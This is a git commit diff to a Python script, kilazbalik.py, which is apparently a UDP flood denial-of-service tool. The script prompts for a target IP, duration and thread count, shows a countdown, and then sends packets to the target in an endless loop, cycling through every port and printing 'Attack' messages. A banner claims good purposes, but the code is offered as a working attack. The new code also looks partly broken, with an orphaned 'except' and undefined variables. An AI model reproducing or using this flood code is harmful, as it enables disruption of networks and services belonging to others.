fcd4c09f0f52e2c9c1f60648f5fd563272778c7b
KUNF24 <kunf5616@gmail.com>
2024-11-26 15:30:18 +0700

    Update kilazbalik.py

--- kilazbalik.py
+++ kilazbalik.py
@@ -27,22 +27,22 @@ class bcolors:
 attemps = 0
 os.system("clear")
 print("")
-print("\033[95m        @       @   @   @     @ @ @ @ @ @ @  @ @ @ @ @        \033[0m")
-print("\033[95m        @     @     @   @      @         @          @       \033[0m")
+print("\033[95m        @       @   @   @     @ @ @ @ @ @ @  @ @ @ @ @       \033[0m")
+print("\033[95m        @     @     @   @      @         @          @        \033[0m")
 print("\033[95m        @   @       @   @       @       @          @         \033[0m")
-print("\033[31m        @ @         @   @        @     @          @             \033[0m")
-print("\033[31m        @  @        @   @         @   @          @                      \033[0m")   
-print("\033[31m        @    @      @   @          @ @          @                      \033[0m")
-print("\033[31m        @      @    @   @ @ @ @ @   @          @ @ @ @ @               \033[0m")
+print("\033[31m        @ @         @   @        @     @          @          \033[0m")
+print("\033[31m        @  @        @   @         @   @          @           \033[0m")   
+print("\033[31m        @    @      @   @          @ @          @            \033[0m")
+print("\033[31m        @      @    @   @ @ @ @ @   @          @ @ @ @ @     \033[0m")
 print("")     
-print("\033[91m      @ @ @      @ @   @     @ @ @ @ @ @     @  @ @ @  @ @ @    \033[0m")
-print("\033[91m            @  @     @ @ @   @    @    @     @  @      @     @  \033[0m")
-print("\033[94m      @ @ @    @ @ @ @ @   @ @    @    @ @ @ @  @ @ @  @ @ @    \033[0m")
-print("\033[94m      @        @     @ @     @    @    @     @  @ @ @  @     @  \033[0m")
-print("")
-print("\033[94m_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—__\033[0m")
-print("\033[95m             SHOULD ONLY BE USED FOR GOOD PURPOSES                      \033[0m")
-print("\033[94m—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—__—\033[0m")
+print("\033[91m            @ @ @       @ @    @         @   @     @         \033[0m")
+print("\033[91m            @     @   @     @  @         @     @   @         \033[0m")
+print("\033[94m            @ @ @     @     @  @         @       @ @         \033[0m")
+print("\033[94m            @     @   @ @ @ @  @         @     @   @         \033[0m")
+print("\033[94m            @ @ @     @     @  @ @ @ @   @   @     @         \033[0m")              
+print("\033[94m_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_\033[0m")
+print("\033[95m             SHOULD ONLY BE USED FOR GOOD PURPOSES               \033[0m")
+print("\033[94m—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—__\033[0m")
 while attemps < 100:
     username = input('\033[33mEnter your username: \033[0m')
     password = input('\033[94mEnter your password: \033[0m')
@@ -62,26 +62,34 @@ choice = str(input("\033[31m(y/n) :  \033[0m"))
 times = int(input("\033[96mTime : \033[0m"))
 threads = int(input("\033[92mThreads :  \033[0m"))
 time.sleep(5),
-print("\033[96m               ⟩⟩  ANTI RACIST \033[0m "),
+print("\033[96m               ⟩⟩  Minus 5 \033[0m "),
 time.sleep(5),
-print("\033[92m               ⟩⟩  ANTI TERRORIST \033[0m "),
+print("\033[92m               ⟩⟩  Minus 4 \033[0m "),
 time.sleep(5),
-print("\033[1m               ⟩⟩  ANTI OPPRESSION \033[0m "),
+print("\033[1m               ⟩⟩  Minus 3 \033[0m "),
 time.sleep(5),
-print("\033[97m               ⟩⟩  ANTI GENOCIDE \033[0m "),
+print("\033[97m               ⟩⟩  Minus 2 \033[0m "),
 time.sleep(5),
-print("\033[95m               ⟩⟩  FUCK U MURDER \033[0m "),
+print("\033[95m               ⟩⟩  Minus 1 \033[0m "),
+time.sleep(5),
+print("\033[92m               ⟩⟩  G0....!! \033[0m "),
 time.sleep(5),
 
-def run():
-	data = random._urandom(1024)
-	i = random.choice(("[+]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-			print("\033[95m[\033[97m+\033[95m] \033[91mRequest Attack  :. " +ip+ " \033[0m")
-		except:
-			print("\033[33m[\033[95m!\033[33m] Error!")
+
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print(f"\033[97m[\033[99m+\033[97m]   Sent  \033[94mPacket:::.... " +ip+ "\033[0m" )
+     print("\033[33m———————————————————————————————————————————⟩⟩")
+     print(f"\033[93m[\033[99m+\033[93m]   Attack  \033[95mWebs:::.... " +ip+ "\033[0m" )
+     print("\033[94m———————————————————————————————————————————⟩⟩")
+     print(f"\033[95m[\033[99m+\033[95m]   Request  \033[32mFull:::... " +ip+ "\033[0m" )
+     print("\033[31m———————————————————————————————————————————⟩⟩")
+     if port == 65534:
+       port = 1
+
+ except:
+     print("\033[33m[\033[95m!\033[33m] Error!")
+			
